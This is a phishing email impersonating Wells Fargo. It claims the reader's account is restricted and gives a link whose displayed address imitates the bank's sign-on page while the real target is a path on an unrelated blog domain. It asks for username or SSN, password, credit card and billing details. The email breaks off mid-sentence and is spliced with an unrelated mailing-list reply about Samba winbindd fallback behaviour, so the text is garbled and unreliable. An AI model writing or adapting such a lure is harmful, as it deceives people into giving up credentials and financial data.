<p><strong>Dear Wells Fargo Customer :</strong></p>
<p>Wells Fargo is constantly working to increase security for all Online Banking
  users. To ensure the integrity of our online payment system, we periodically
  review accounts.</p>
<p>Your account might be place on restricted status. Restricted accounts continue
  to receive payments, but they are limited in their ability to send or withdraw
funds.</p>
<p>To lift up this restriction follow the link bellow and fill in the necessary
fields:</p>
<p><a href="http://blog.herrbaumann.de/images/online.wellsfargo.com/auxiliary_access/1999/bb61162e7a787f/common/az1_db3_on/cgi-bin/a248.e.akamai.net/Mprc6XvBkuZqDGNbqlxb&PROCESSING_TRANSACTIO/wellsfargo/">https://online.wellsfargo.com/signon?LOB=CONS</a><br>
</p>
<p>Then ...you need to login into your account (<strong>with your username or
    SSN and
your password</strong>) , then you have to complete our verification process. You must
confirm your credit card details and your billing information as well . All restricted
  accounts have their billing information unconfirmed, meaning that you may no

  on file.<br>

Volker,

We should have better fallback code in this case to
detect failure and fall back to the winbindd_rpc methods.

My experiences are not quite the same as yours an Tridge's.
Centeris is making a living from selling a winbindd based
solution into AD environments and our experience has been
that the majority of the time, the domain environment is
setup correctly and the AD admins are pretty competent folks.

The reason why I'm opposed to reverting the "use winbindd_ads
whenever possible" is that if penalizes everyone who uses
Samba for the benefit of a few broken installations.
I'm a little surprised since you have been the main proponent
of getting rid of any distinction between security ads and
security = domain.

However, it there really has to be a way to deal with this,
I would have to vote for Tridge's patch.  As much as I
hate new parameters, at least this one would not change
the current default behavior which I believe to be correct.






cheers, jerry
